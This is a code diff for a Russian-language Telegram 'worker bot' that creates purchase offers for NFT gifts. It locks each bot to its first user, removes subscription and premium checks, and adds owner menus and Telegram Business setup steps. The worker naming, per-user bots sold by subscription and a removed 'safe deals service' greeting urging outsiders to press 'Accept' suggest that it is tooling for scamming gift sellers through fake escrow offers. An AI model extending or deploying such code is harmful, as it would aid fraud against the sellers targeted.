@@ -44,66 +44,206 @@ class CreateOfferStates(StatesGroup):
     confirm_send = State()
     waiting_recipient = State()
 
-@worker_router.message(CommandStart())
-async def handle_worker_start(message: Message, bot: Bot):
+async def check_or_lock_bot_owner(bot: Bot, from_user_id: int) -> bool:
     """
-    Приветствие внутри Рабочего бота.
-    Если пишет владелец бота — выводит кнопки создания оффера.
-    Если пишет посторонний — выводит нейтральное приветствие.
+    Проверяет, является ли пользователь единственным владельцем бота.
+    Бот жестко блокируется ТОЛЬКО за 1 чатом (первый написавший пользователь).
+    Для ВСЕХ остальных пользователей и чатов доступ полностью закрыт.
+    Кэшировано в памяти (O(1)) без лишних сетевых вызовов к Telegram API.
     """
-    user = message.from_user
-    worker_rec = await db.get_worker_bot(user.id)
-    bot_info = await bot.get_me()
+    from worker_manager import worker_manager
+    bot_id = bot.id
 
-    is_owner = (worker_rec and worker_rec.get("bot_id") == bot_info.id) or (user.id in config.ADMIN_IDS)
+    owner_id = worker_manager.bot_owners.get(bot_id)
+    if not owner_id:
+        rec = await db.get_worker_bot_by_bot_id(bot_id)
+        if rec and rec.get("owner_tg_id"):
+            owner_id = rec["owner_tg_id"]
+            worker_manager.bot_owners[bot_id] = owner_id
+        elif rec and rec.get("user_id") and rec["user_id"] > 100000:
+            owner_id = rec["user_id"]
+            worker_manager.bot_owners[bot_id] = owner_id
 
-    if is_owner:
-        text = (
-            f"👋 <b>Добро пожаловать в ваш рабочий бот (@{bot_info.username})!</b>\n\n"
-            f"⚙️ <b>ОБЯЗАТЕЛЬНЫЙ ЧЕК-ЛИСТ НАСТРОЙКИ (в @BotFather):</b>\n\n"
-            f"1️⃣ <b>/setinline ➔ @{bot_info.username} ➔ плейсхолдер: <code>подарок</code></b>\n"
-            f"⚠️ <i>(ОБЯЗАТЕЛЬНО! Без этого кнопка «Отправить оффер» не сможет работать!)</i>\n\n"
-            f"2️⃣ <b>/setinlinefeedback ➔ @{bot_info.username} ➔ <code>Enabled (100%)</code></b>\n"
-            f"<i>(ОБЯЗАТЕЛЬНО для обратной связи и авто-таймеров сделок)</i>\n\n"
-            f"3️⃣ <b>Telegram Business (по желанию):</b>\n"
-            f"• Подключите @{bot_info.username} в <i>Настройки ➔ Telegram Business ➔ Чат-боты</i> на вашем аккаунте для прямой отправки прямо в диалог продавцу."
-        )
-        await message.answer(text, reply_markup=get_worker_bot_main_keyboard(), parse_mode="HTML")
-    else:
-        text = (
-            f"🛡 <b>Добро пожаловать в сервис безопасных сделок.</b>\n\n"
-            f"Бот предназначен для верификации и проведения безопасных обменов Telegram-подарками.\n"
-            f"Если вам прислали оффер на покупку подарка — нажмите кнопку «Принять» в карточке оффера."
-        )
-        await message.answer(text, parse_mode="HTML")
+    # Первый вход — навсегда блокируем бота за этим чатом
+    if not owner_id:
+        owner_id = from_user_id
+        worker_manager.bot_owners[bot_id] = owner_id
+        await db.set_worker_bot_owner(bot_id, owner_id)
+        logger.info(f"🔒 Бот {bot_id} успешно привязан ТОЛЬКО к чату {owner_id}")
+        return True
 
-@worker_router.message(Command("create"))
-async def handle_cmd_create(message: Message, state: FSMContext):
-    user_id = message.from_user.id
-    is_active = await db.is_subscription_active(user_id)
-    if not is_active:
-        await message.answer(
-            "❌ <b>Для создания офферов требуется активная подписка.</b>\n"
-            "Пожалуйста, откройте Главного бота сервиса и продлите подписку.",
+    return from_user_id == owner_id or from_user_id in config.ADMIN_IDS
+
+@worker_router.message.outer_middleware()
+async def worker_message_guard(handler, event: Message, data: dict):
+    if not event.from_user:
+        return await handler(event, data)
+    bot: Bot = data["bot"]
+    user_id = event.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        await event.answer(
+            "⛔ <b>Доступ ограничен.</b>\n\n"
+            "Этот бот является персональным рабочим инструментом и привязан только к одному владельцу.",
             parse_mode="HTML"
         )
         return
+    return await handler(event, data)
+
+@worker_router.callback_query.outer_middleware()
+async def worker_callback_guard(handler, event: CallbackQuery, data: dict):
+    if not event.from_user:
+        return await handler(event, data)
+    bot: Bot = data["bot"]
+    user_id = event.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        await safe_answer(event, "⛔ Этот бот является персональным и открыт только для своего владельца.", show_alert=True)
+        return
+    return await handler(event, data)
+
+@worker_router.message(CommandStart())
+async def handle_worker_start(message: Message, bot: Bot):
+    user_id = message.from_user.id
+    bot_info = await bot.get_me()
+
+    text = (
+        f"👋 <b>Добро пожаловать в панель управления ботом @{bot_info.username}!</b>\n\n"
+        f"🔑 <b>Статус:</b> <code>Владелец (Эксклюзивный доступ)</code>\n"
+        f"🔒 <b>Защита:</b> <i>Привязан только к вашему чату, посторонние не могут пользоваться ботом.</i>\n\n"
+        f"Вам сразу доступны все права: создание офферов, статистика и управление сделками."
+    )
+    await message.answer(text, reply_markup=get_worker_bot_main_keyboard(), parse_mode="HTML")
+
+@worker_router.message(Command("create"))
+async def handle_cmd_create(message: Message, bot: Bot, state: FSMContext):
+    user_id = message.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await message.answer("⛔ Доступ ограничен.", parse_mode="HTML")
 
     await state.clear()
     await state.set_state(CreateOfferStates.waiting_gift_url)
-    await message.answer("🔗 <b>Введи ссылку на подарок:</b>", parse_mode="HTML")
+    await message.answer("🔗 <b>Введите ссылку на подарок (например, https://t.me/nft/BigYear-70698):</b>", parse_mode="HTML")
 
 @worker_router.callback_query(F.data == "menu_create")
-async def handle_menu_create(callback: CallbackQuery, state: FSMContext):
+async def handle_menu_create(callback: CallbackQuery, bot: Bot, state: FSMContext):
     user_id = callback.from_user.id
-    is_active = await db.is_subscription_active(user_id)
-    if not is_active:
-        await safe_answer(callback, "Для создания офферов требуется активная подписка!", show_alert=True)
-        return
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await safe_answer(callback, "⛔ Доступ ограничен (чужой бот)", show_alert=True)
 
     await state.clear()
     await state.set_state(CreateOfferStates.waiting_gift_url)
-    await callback.message.answer("🔗 <b>Введи ссылку на подарок:</b>", parse_mode="HTML")
+    await callback.message.answer("🔗 <b>Введите ссылку на подарок (например, https://t.me/nft/BigYear-70698):</b>", parse_mode="HTML")
+    await safe_answer(callback)
+
+@worker_router.callback_query(F.data == "menu_profile")
+async def handle_worker_profile(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await safe_answer(callback, "⛔ Доступ ограничен", show_alert=True)
+
+    bot_info = await bot.get_me()
+    deals = await db.get_deals_by_buyer(user_id)
+    deals_count = len(deals)
+    completed_deals = len([d for d in deals if d.get("status") == "COMPLETED"])
+    total_stars = sum(d.get("stars_amount", 0) for d in deals if d.get("status") == "COMPLETED")
+
+    text = (
+        f"👤 <b>Профиль владельца бота</b>\n\n"
+        f"🤖 <b>Бот:</b> @{bot_info.username}\n"
+        f"🆔 <b>Ваш Chat ID:</b> <code>{user_id}</code>\n"
+        f"💎 <b>Права:</b> <code>Владелец (Полный доступ без лимитов)</code>\n"
+        f"🔒 <b>Режим:</b> <code>Приватный (Только этот чат)</code>\n\n"
+        f"📊 <b>Статистика офферов:</b>\n"
+        f"• Всего создано офферов: <b>{deals_count}</b>\n"
+        f"• Успешных сделок: <b>{completed_deals}</b>\n"
+        f"• Общий объем: <b>{total_stars} ⭐️</b>\n"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🚀 Создать оффер", callback_data="menu_create")],
+        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="menu_my_deals")],
+        [InlineKeyboardButton(text="⬅️ Главное меню", callback_data="menu_main")]
+    ])
+    try:
+        await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
+    await safe_answer(callback)
+
+@worker_router.callback_query(F.data.in_(["menu_my_deals", "menu_deals"]))
+async def handle_worker_my_deals(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await safe_answer(callback, "⛔ Доступ ограничен", show_alert=True)
+
+    deals = await db.get_deals_by_buyer(user_id, limit=10)
+    if not deals:
+        text = (
+            "📋 <b>Ваши сделки</b>\n\n"
+            "У вас пока нет созданных офферов.\n"
+            "Нажмите «Создать оффер», чтобы отправить первое предложение!"
+        )
+    else:
+        text = "📋 <b>Последние сделки бота:</b>\n\n"
+        for d in deals[:8]:
+            st = d.get("status", "PENDING")
+            st_icon = "⏳" if st in ("PENDING", "CONFIRMING") else ("✅" if st == "COMPLETED" else "❌")
+            text += (
+                f"{st_icon} <b>#{d['deal_id']}</b>: {d.get('nft_name')} #{d.get('nft_number')} — "
+                f"<b>{d.get('stars_amount')} {d.get('currency', '⭐️')}</b> [{st}]\n"
+            )
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🚀 Создать оффер", callback_data="menu_create")],
+        [InlineKeyboardButton(text="🔄 Обновить", callback_data="menu_my_deals")],
+        [InlineKeyboardButton(text="⬅️ Главное меню", callback_data="menu_main")]
+    ])
+    try:
+        await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
+    await safe_answer(callback)
+
+@worker_router.callback_query(F.data == "menu_main")
+async def handle_worker_main_menu(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await safe_answer(callback, "⛔ Доступ ограничен", show_alert=True)
+
+    bot_info = await bot.get_me()
+    text = (
+        f"👋 <b>Главное меню бота @{bot_info.username}</b>\n\n"
+        f"🔑 <b>Статус:</b> <code>Владелец (Эксклюзивный доступ)</code>\n"
+        f"🔒 <b>Защита:</b> <i>Бот заблокирован только для этого чата.</i>\n\n"
+        f"Выберите нужное действие ниже:"
+    )
+    try:
+        await callback.message.edit_text(text, reply_markup=get_worker_bot_main_keyboard(), parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=get_worker_bot_main_keyboard(), parse_mode="HTML")
+    await safe_answer(callback)
+
+@worker_router.callback_query(F.data == "menu_business")
+async def handle_worker_business(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not await check_or_lock_bot_owner(bot, user_id):
+        return await safe_answer(callback, "⛔ Доступ ограничен", show_alert=True)
+
+    bot_info = await bot.get_me()
+    text = (
+        f"💼 <b>Подключение Telegram Business</b>\n\n"
+        f"Вы можете подключить бота @{bot_info.username} прямо в диалоги вашего Telegram-аккаунта:\n\n"
+        f"1. Откройте <i>Настройки Telegram ➔ Telegram Business</i>\n"
+        f"2. Выберите раздел <b>«Чат-боты»</b>\n"
+        f"3. Введите username: <b>@{bot_info.username}</b>\n"
+        f"4. Разрешите боту отвечать на сообщения.\n\n"
+        f"После этого офферы смогут отправляться автоматически прямо в диалог с продавцом!"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Главное меню", callback_data="menu_main")]
+    ])
+    try:
+        await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
     await safe_answer(callback)
 
 async def process_gift_url(message: Message, state: FSMContext, input_text: str, price: Optional[int] = None):
@@ -149,7 +289,7 @@ async def process_gift_url(message: Message, state: FSMContext, input_text: str,
             await status_msg.delete()
         except Exception:
             pass
-        is_premium = await db.is_subscription_active(message.from_user.id, required_plan="premium")
+        is_premium = True
         await message.answer(
             card_text,
             reply_markup=get_create_confirm_keyboard("RU", is_premium=is_premium),
@@ -182,10 +322,9 @@ async def handle_create_gift_url(message: Message, state: FSMContext):
     await process_gift_url(message, state, message.text or "")
 
 @worker_router.message(F.text.regexp(r'(https?://)?(t\.me/nft/|fragment\.com/)\S+'))
-async def handle_direct_nft_link(message: Message, state: FSMContext):
+async def handle_direct_nft_link(message: Message, bot: Bot, state: FSMContext):
     user_id = message.from_user.id
-    is_active = await db.is_subscription_active(user_id)
-    if not is_active:
+    if not await check_or_lock_bot_owner(bot, user_id):
         return
 
     text = (message.text or "").strip()
@@ -256,7 +395,7 @@ async def handle_create_price_input(message: Message, state: FSMContext):
         show_above_text=True
     )
     await state.set_state(CreateOfferStates.confirm_send)
-    is_premium = await db.is_subscription_active(message.from_user.id, required_plan="premium")
+    is_premium = True
     await message.answer(
         card_text,
         reply_markup=get_create_confirm_keyboard(lang, is_premium=is_premium),
@@ -282,7 +421,7 @@ async def handle_create_toggle_lang(callback: CallbackQuery, state: FSMContext):
         prefer_large_media=True,
         show_above_text=True
     )
-    is_premium = await db.is_subscription_active(callback.from_user.id, required_plan="premium")
+    is_premium = True
     try:
         await callback.message.edit_text(
             card_text,
@@ -296,12 +435,6 @@ async def handle_create_toggle_lang(callback: CallbackQuery, state: FSMContext):
 
 @worker_router.callback_query(F.data == "create_change_recipient")
 async def handle_create_change_recipient(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    is_premium = await db.is_subscription_active(user_id, required_plan="premium")
-    if not is_premium:
-        await safe_answer(callback, "Указание другого получателя доступно только на тарифе Premium!", show_alert=True)
-        return
-
     await state.set_state(CreateOfferStates.waiting_recipient)
     await callback.message.answer("👤 <b>Введите @username или ID нового получателя:</b>", parse_mode="HTML")
     await safe_answer(callback)
@@ -547,17 +680,7 @@ async def handle_business_message_tracker(message: Message):
 @worker_router.inline_query()
 async def handle_inline_query(inline_query: InlineQuery, bot: Bot):
     user = inline_query.from_user
-    is_active = await db.is_subscription_active(user.id)
-    if not is_active:
-        article = InlineQueryResultArticle(
-            id="sub_required",
-            title="🔒 Требуется подписка",
-            description="Оформите подписку в Главном боте для использования инлайн-режима.",
-            input_message_content=InputTextMessageContent(
-                message_text="Для использования офферов оформите подписку в Главном боте."
-            )
-        )
-        await inline_query.answer([article], cache_time=1, is_personal=True)
+    if not await check_or_lock_bot_owner(bot, user.id):
         return
 
     query_text = (inline_query.query or "").strip()
